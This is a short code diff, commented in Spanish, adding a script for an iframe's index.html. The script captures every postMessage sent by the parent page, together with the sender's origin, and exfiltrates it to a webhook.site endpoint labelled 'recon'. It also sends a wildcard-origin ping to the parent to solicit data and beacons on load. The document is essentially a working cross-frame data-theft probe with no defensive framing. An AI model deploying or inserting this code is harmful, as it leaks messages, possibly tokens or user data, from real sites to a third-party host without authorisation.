@@ -1,0 +1,23 @@
+// En tu index.html del iframe
+(function() {
+  var WEBHOOK = 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon';
+
+  // Escuchás mensajes que el parent te mande
+  window.addEventListener('message', function(e) {
+    fetch(WEBHOOK, {
+      method: 'POST',
+      mode: 'no-cors',
+      body: JSON.stringify({
+        tipo: 'message_received',
+        data: JSON.stringify(e.data),
+        origin: e.origin
+      })
+    });
+  });
+
+  // Intentás que el parent te mande algo
+  window.parent.postMessage('ping', '*');
+
+  // Ping base
+  fetch(WEBHOOK + '?ev=load', { method: 'GET', mode: 'no-cors' });
+})();
